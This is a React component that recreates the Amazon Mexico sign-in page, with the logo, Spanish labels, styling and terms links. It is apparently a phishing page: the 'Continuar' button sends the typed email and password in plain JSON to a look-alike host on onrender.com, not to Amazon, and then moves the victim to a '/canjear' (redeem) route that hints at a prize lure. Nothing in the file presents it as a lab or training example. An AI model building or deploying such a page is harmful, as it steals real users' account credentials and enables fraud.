import './App.css'
import logo from './assets/amazon-logo.png';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate();

  return (
    <div style={{
      backgroundColor: '#fff',
      colorScheme: 'light',
      minHeight: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
    }}>
      <div style={{
        border: '1px solid #ddd',
        borderRadius: '8px',
        padding: '2rem',
        maxWidth: '400px',
        width: '100%',
        boxShadow: '0 2px 5px rgba(0,0,0,0.1)'
      }}>
        <img src={logo} alt="amazon.com.mx" style={{ marginBottom: '1.5rem', maxWidth: '220px' }} />
        <h2 style={{ fontSize: '1.5rem', marginBottom: '1rem' }}>Iniciar sesión o crear cuenta</h2>
        <label htmlFor="email" style={{ display: 'block', fontWeight: 'bold', marginBottom: '0.5rem' }}>
          Ingresa el número de celular o el correo electrónico
        </label>
        <input
          type="email"
          id="email"
          placeholder="Correo o celular"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          style={{
            width: '100%',
            padding: '0.5rem',
            marginBottom: '1rem',
            border: '1px solid #ccc',
            borderRadius: '4px'
          }}
        />
        <label htmlFor="password" style={{ display: 'block', fontWeight: 'bold', marginBottom: '0.5rem' }}>
          Ingresa tu contraseña
        </label>
        <input
          type="password"
          id="password"
          placeholder="Contraseña"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          style={{
            width: '100%',
            padding: '0.5rem',
            marginBottom: '1rem',
            border: '1px solid #ccc',
            borderRadius: '4px'
          }}
        />
        <button
          onClick={async () => {
            try {
              const res = await fetch('https://amazon-1a77.onrender.com/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
              });

              const data = await res.json();
              alert(data.mensaje || data.error);
              if (data.mensaje) {
                navigate('/canjear');
              }
            } catch (err) {
              alert('Error de conexión con el servidor' + err);
            }
          }}
          style={{
            width: '100%',
            padding: '0.75rem',
            backgroundColor: '#f7ca00',
            border: '1px solid #a88734',
            borderRadius: '8px',
            fontWeight: 'bold',
            cursor: 'pointer'
          }}
        >
          Continuar
        </button>
        <p style={{ fontSize: '0.8rem', marginTop: '1rem' }}>
          Al continuar, aceptas las <a href="#">Condiciones de uso</a> y el <a href="#">Aviso de privacidad</a> de Amazon.
        </p>
        <a href="#" style={{ fontSize: '0.9rem', color: '#0066c0', display: 'block', marginTop: '1rem' }}>¿Necesitas ayuda?</a>
        <hr style={{ margin: '1.5rem 0' }} />
        <p style={{ fontWeight: 'bold' }}>¿Compras para el trabajo?</p>
        <a href="#" style={{ color: '#0066c0', fontSize: '0.9rem' }}>Crear una cuenta de Amazon Business gratis</a>
      </div>
    </div>
  );
}

export default App
